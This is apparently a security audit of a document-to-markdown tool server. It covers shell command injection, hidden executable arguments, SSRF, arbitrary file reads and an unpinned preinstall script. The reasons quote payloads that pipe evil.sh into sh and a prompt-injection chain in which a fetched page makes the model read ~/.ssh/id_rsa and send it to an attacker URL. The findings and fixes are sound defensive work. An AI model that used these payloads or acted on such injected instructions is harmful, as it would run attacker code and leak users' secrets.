title: filepath tool argument pasted into a shell command
reason: filepath from any *-to-markdown tool is placed inside double quotes in a string run by child_process.exec (a shell); a value like `x"; curl evil.sh | sh; "` or `$(id)` runs arbitrary commands.
fix: Use execFile(uvPath, ['run', markitdownPath, '--', filePath]) with no shell, and resolve filePath and check it is inside an allowed directory.

title: Hidden uvPath/projectRoot arguments choose the executable that is run
reason: Every conversion tool accepts undeclared uvPath and projectRoot arguments from the caller and uses uvPath as the start of the shell command, so a call with uvPath `sh -c 'curl evil|sh' #` (or any program) runs it; the input schema does not list these fields but the zod schema accepts them.
fix: Remove uvPath and projectRoot from RequestPayloadSchema; take them only from operator config (env), and use execFile without a shell.

title: URL tools fetch any URL and return the body
reason: youtube/bing/webpage-to-markdown fetch whatever URL the model gives with no scheme/host check, so http://169.254.169.254/... or http://localhost:port/admin is fetched and the converted body is returned to the model.
fix: Allow only https, resolve the host and block private/loopback/link-local/IPv6-local addresses, re-check on redirects (redirect: 'manual'), and restrict the YouTube/Bing tools to their own hosts.

title: get-markdown-file and the file tools read any file on disk
reason: filepath is used as-is with no root or containment check, so get-markdown-file with ~/.ssh/id_rsa, ~/.aws/credentials or .env returns the secret to the model (the conversion tools likewise pass any path to markitdown).
fix: Resolve the path with fs.realpath and require path.relative(allowedRoot, real) not to start with '..' (allowedRoot = the server's temp output dir for get-markdown-file and a configured input dir for the converters).

title: Fetched web pages and documents are returned raw into the model context
reason: Text from any web page, search result, video transcript or document goes straight to the model unmarked; instructions hidden there can steer the model into the file-read and command-injection tools above.
fix: Wrap returned content in clearly delimited untrusted-data markers and tell the client it is untrusted; fixing M001-M004 limits what injected text can trigger.

title: One server combines untrusted web input, local file read and an outbound fetch
reason: A page fetched by webpage-to-markdown can tell the model to read ~/.ssh/id_rsa with get-markdown-file and then call webpage-to-markdown with https://attacker/?d=<contents>, exfiltrating it with no approval step.
fix: Restrict file reads to a sandbox directory, restrict fetch hosts, and require user approval for file-read tools in the client.

title: npm preinstall pipes a remote installer into sh
reason: Installing the package runs an unpinned remote script with the installer's privileges; a compromise of that URL compromises every install.
fix: Document uv as a prerequisite instead of installing it in preinstall, or pin a specific uv version and verify its checksum.
